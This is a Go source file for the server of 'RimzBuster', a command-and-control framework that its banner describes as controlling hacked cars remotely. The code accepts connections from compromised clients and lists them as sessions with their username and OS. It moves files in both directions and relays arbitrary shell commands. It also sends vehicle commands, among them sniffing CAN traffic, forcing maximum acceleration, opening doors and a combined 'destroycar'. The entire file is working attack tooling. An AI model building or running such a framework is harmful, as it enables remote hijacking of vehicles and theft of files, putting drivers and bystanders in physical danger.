package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"github.com/faiface/beep"
	"github.com/faiface/beep/speaker"
	"github.com/faiface/beep/mp3"
	"github.com/olekukonko/tablewriter"
)

type Session struct {
	ID          int
	Conn        net.Conn
	ShellActive bool
	Username    string
	OS          string
	TimeZone    string
	LocalTime   string
}

var (
	sessions    = make(map[int]*Session)
	sessionID   = 0
	sessionsMtx sync.Mutex
)

func main() {
    printBanner()
    audioFilePath := filepath.Join("..", "media", "f1.mp3")
    if err := playAudio(audioFilePath); err != nil {
        log.Fatalf("Failed to play audio: %v", err)
    }
	log.Println("[+] Starting RimzBuster server...")
	startServer(":8080")
}

func playAudio(filePath string) error {
    f, err := os.Open(filePath)
    if (err != nil) {
        return err
    }
    defer f.Close()

    streamer, format, err := mp3.Decode(f)
    if (err != nil) {
        return err
    }
    defer streamer.Close()

    speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/6))
    done := make(chan bool)
    speaker.Play(beep.Seq(streamer, beep.Callback(func() {
        done <- true
    })))
    <-done
    return nil
}

func printBanner() {

    	// ANSI escape code for light red color
	lightRed := "\033[91m"
	// ANSI escape code to reset color
	reset := "\033[0m"

	fmt.Println(lightRed +`

    ██████╗ ██╗███╗   ███╗███████╗██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗
    ██╔══██╗██║████╗ ████║╚══███╔╝██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██████╔╝██║██╔████╔██║  ███╔╝ ██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝
    ██╔══██╗██║██║╚██╔╝██║ ███╔╝  ██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
    ██║  ██║██║██║ ╚═╝ ██║███████╗██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║
    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

                                     d88b
                     _______________|8888|_______________
                    |_____________ ,~~~~~~. _____________|
                    |_____________: mmmmmm :_____________|
  _______    ,----|~~~~~~~~~~~,,_...._..~~~~~~~~~~~|----,------,   _______
|         |  |    |         |_____,d~    ~b.|____|       |    |  |         |
|         |-------------------d.-~~~~~~-.b-/-------------------| |         |
|         | |8888 ....... _,===~/......... ~===._         8888|  |         |
|         |=========_,===~~======._.=~~=._.======~~===._=========|         |
|         | |888===~~ ...... //,, .~~~~'. .,          ~~===888|  |         |
|         |===================,P'.::::::::.. ?===================|         |
|         |_________________,P'_:----------.._?,_________________|         |
|         |-------------------~~~~~~~~~~~~~~~~~~---------------- |         |
  _______/                                                       \_________/

𝙰 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚊𝚗𝚍 𝙲𝚘𝚗𝚝𝚛𝚘𝚕 𝙵𝚛𝚊𝚖𝚎𝚠𝚘𝚛𝚔 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝚑𝚊𝚌𝚔𝚎𝚍 𝚌𝚊𝚛𝚜 𝚛𝚎𝚖𝚘𝚝𝚎𝚕𝚢.

                                            𝙱𝚞𝚒𝚕𝚝 𝚋𝚢: 𝚅𝚊𝚕𝚎𝚛𝚒𝚊𝚗 𝙶𝚛𝚒𝚏𝚏𝚒𝚝𝚑𝚜
                                            𝙶𝚒𝚝𝚑𝚞𝚋: 𝚑𝚝𝚝𝚙𝚜://𝚐𝚒𝚝𝚑𝚞𝚋.𝚌𝚘𝚖/𝚟𝚎𝚗𝚐𝚎𝚊𝚗𝚌𝚎
  `+ reset)
}

func startServer(address string) {
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalf("[-] Failed to start server: %v", err)
	}
	defer listener.Close()

	log.Printf("[+] Server started on %s", address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[-] Failed to accept connection: %v", err)
			continue
		}

		go func(conn net.Conn) {
			username := getUsername(conn)
			osInfo := getOSInfo(conn)
			timeZone := getTimeZone(conn)
			localTime := getLocalTime(conn)

			sessionsMtx.Lock()
			sessionID++
			newSession := &Session{
				ID:          sessionID,
				Conn:        conn,
				ShellActive: false,
				Username:    username,
				OS:          osInfo,
				TimeZone:    timeZone,
				LocalTime:   localTime,
			}
			sessions[sessionID] = newSession
			sessionsMtx.Unlock()
			handleSession(newSession)
		}(conn)
	}
}

func getUsername(conn net.Conn) string {
	conn.Write([]byte("whoami\n"))
	reader := bufio.NewReader(conn)
	username, _ := reader.ReadString('\n')
	return strings.TrimSpace(username)
}

func getOSInfo(conn net.Conn) string {
	conn.Write([]byte("osinfo\n"))
	reader := bufio.NewReader(conn)
	osInfo, _ := reader.ReadString('\n')
	return strings.TrimSpace(osInfo)
}

func getTimeZone(conn net.Conn) string {
	conn.Write([]byte("timezone\n"))
	return readCompleteResponse(conn)
}

func getLocalTime(conn net.Conn) string {
	conn.Write([]byte("localtime\n"))
	return readCompleteResponse(conn)
}

func handleSession(s *Session) {
	defer func() {
		s.Conn.Close()
		sessionsMtx.Lock()
		delete(sessions, s.ID)
		sessionsMtx.Unlock()
	}()

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Rimzbuster> ")
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "" {
			continue
		}

		if command == "exit" {
			fmt.Println("Quitting RimzBuster")
			os.Exit(0)
		}

		if command == "sessions -l" {
			listSessions()
			continue
		}

		if command == "help" {
			showHelp()
			continue
		}

		if strings.HasPrefix(command, "sessions -i ") {
			parts := strings.Split(command, " ")
			if len(parts) != 3 {
				fmt.Println("Usage: sessions -i <sessionID>")
				continue
			}

			sessionID, err := strconv.Atoi(parts[2])
			if err != nil {
				fmt.Println("Invalid session ID")
				continue
			}

			sessionsMtx.Lock()
			targetSession, exists := sessions[sessionID]
			sessionsMtx.Unlock()

			if !exists {
				fmt.Printf("Session ID %d does not exist\n", sessionID)
				continue
			}

			interactWithSession(targetSession)
		} else {
			fmt.Println("Unknown command")
		}
	}
}

func listSessions() {
	sessionsMtx.Lock()
	defer sessionsMtx.Unlock()

	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"ID", "Username", "OS", "Time Zone", "Local Time"})

	for _, session := range sessions {
		table.Append([]string{
			strconv.Itoa(session.ID),
			session.Username,
			session.OS,
			session.TimeZone,
			session.LocalTime,
		})
	}

	table.Render()
}

func showHelp() {
	fmt.Println(`
+----------------------------------------------------------+
|                  🏎️ RIMZBUSTER COMMANDS                  |
+------------------------------------------+---------------+
| Commands🥷                               | Description   |
+------------------------------------------+---------------+
| help                                     | Help menu     |
|..........................................|...............|
| sessions -l                              | List clients  |
|..........................................|...............|
| sessions -i <sessionID>                  | Choose client |
|..........................................|...............|
| exit                                     | Exit C2       |
+------------------------------------------+---------------+
| In-session Commands😈                    | Description   |
+------------------------------------------+---------------+
| upload <localpath> <remotedir>           | Upload a file |
|..........................................|...............|
| download <remotepath> <localpath>        | Download file |
|..........................................|...............|
| exit                                     | Exit session  |
+------------------------------------------+---------------+
| sniff                                    | Receive CAN   |
|                                          | Packet dump   |
|..........................................|...............|
| accelerate                               | Increase speed|
|                                          | to maximum    |
|..........................................|...............|
| rightsignal                              | Turn Right    |
|                                          | Indicator On  |
|..........................................|...............|
| leftsignal                               | Turn Left     |
|                                          | Indicator On  |
|..........................................|...............|
| hazard                                   | Turn Hazard   |
|                                          | Lights On     |
|..........................................|...............|
| dooropen                                 | Opens all     |
|                                          | Doors         |
|..........................................|...............|
| doorclose                                | Closes all    |
|                                          | Doors         |
|..........................................|...............|
| destroycar                               | All Combined  |
+------------------------------------------+---------------+`)
}

func interactWithSession(s *Session) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("Session %s> ", s.Username)
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "exit" {
			fmt.Println("Exiting session interaction!")
			return
		}

		parts := strings.SplitN(command, " ", 2)
		sessionCommand := parts[0]

		switch sessionCommand {
		case "upload":
			if len(parts) < 2 {
				fmt.Println("[!] Usage: upload <localpath> <remotedir>")
				continue
			}
			filePaths := strings.SplitN(parts[1], " ", 2)
			if len(filePaths) != 2 {
				fmt.Println("[!] Usage: upload <localpath> <remotedir>")
				continue
			}
			err := uploadFile(s.Conn, filePaths[0], filePaths[1])
			if err != nil {
				fmt.Printf("[-] Error uploading file: %v\n", err)
			} else {
				fmt.Println("[+] File uploaded successfully")
			}
		case "download":
			if len(parts) < 2 {
				fmt.Println("[!] Usage: download <remotepath> <localpath>")
				continue
			}
			filePaths := strings.SplitN(parts[1], " ", 2)
			if len(filePaths) != 2 {
				fmt.Println("[!] Usage: download <remotepath> <localpath>")
				continue
			}
			err := downloadFile(s.Conn, filePaths[0], filePaths[1])
			if err != nil {
				fmt.Printf("[-] Error downloading file: %v\n", err)
			} else {
				fmt.Println("[+] File downloaded successfully")
			}
        case "sniff":
			s.Conn.Write([]byte("sniff\n"))
			fmt.Println("Sniffing over the next 15 seconds...")
			time.Sleep(15 * time.Second)
			response := readCompleteResponse(s.Conn)
			fmt.Println(response)

        case "accelerate":
            s.Conn.Write([]byte("accelerate\n"))
            fmt.Println("Accelerating to maximum speed ...")

            // Path to the audio file
            audioFilePath := filepath.Join("..", "media", "accelerate.mp3")

            // Start playing audio in a separate goroutine
            var wg sync.WaitGroup
            wg.Add(1)
            go func() {
                defer wg.Done()
                if err := playAudio(audioFilePath); err != nil {
                    fmt.Printf("Error playing audio: %v\n", err)
                }
            }()

            // Wait for the client to complete the acceleration
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

            // Wait for the audio to finish
            wg.Wait()

        case "leftsignal":
            s.Conn.Write([]byte("leftsignal\n"))
            fmt.Println("Indicating Left[!]")
            time.Sleep(10 * time.Second)
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "rightsignal":
            s.Conn.Write([]byte("rightsignal\n"))
            time.Sleep(10 * time.Second)
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "hazard":
            s.Conn.Write([]byte("hazard\n"))
            fmt.Println("Starting Hazard Lights[!]")
            time.Sleep(10 * time.Second)
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "dooropen":
            s.Conn.Write([]byte("dooropen\n"))
            fmt.Println("Executing Door Open[!]")
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "doorclose":
            s.Conn.Write([]byte("doorclose\n"))
            fmt.Println("Executing Door Close[!]")
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

		default:
			s.Conn.Write([]byte(command + "\n"))
			response := readCompleteResponse(s.Conn)
			fmt.Println(response)
		}
	}
}

func uploadFile(conn net.Conn, localPath string, remoteDir string) error {
	file, err := os.Open(localPath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Extract the file name from the local path
	fileName := filepath.Base(localPath)
	remotePath := filepath.Join(remoteDir, fileName)

	conn.Write([]byte(fmt.Sprintf("upload %s\n", remotePath)))

	buf := make([]byte, 1024)
	for {
		n, err := file.Read(buf)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}
		conn.Write(buf[:n])
	}

	conn.Write([]byte("EOF\n"))
	return nil
}

func downloadFile(conn net.Conn, remotePath string, localPath string) error {
	// Determine the final file path
	var finalPath string
	if stat, err := os.Stat(localPath); err == nil && stat.IsDir() {
		// If localPath is a directory, append the file name from remotePath
		fileName := filepath.Base(remotePath)
		finalPath = filepath.Join(localPath, fileName)
	} else {
		// If localPath is a file path, use it as is
		finalPath = localPath
	}

	// Send the download request to the client
	conn.Write([]byte(fmt.Sprintf("download %s\n", remotePath)))

	file, err := os.Create(finalPath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()

	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			if err == io.EOF {
				break
			}
			return fmt.Errorf("failed to receive file: %v", err)
		}

		content := string(buf[:n])
		if strings.Contains(content, "EOF\n") {
			content = strings.Replace(content, "EOF\n", "", 1)
			if len(content) > 0 {
				file.Write([]byte(content))
			}
			break
		}

		file.Write(buf[:n])
	}

	return nil
}

func readCompleteResponse(conn net.Conn) string {
	reader := bufio.NewReader(conn)
	var response strings.Builder
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				break
			}
			return fmt.Sprintf("Error reading response: %v", err)
		}
		if line == "EOF\n" {
			break
		}
		response.WriteString(line)
	}
	return response.String()
}
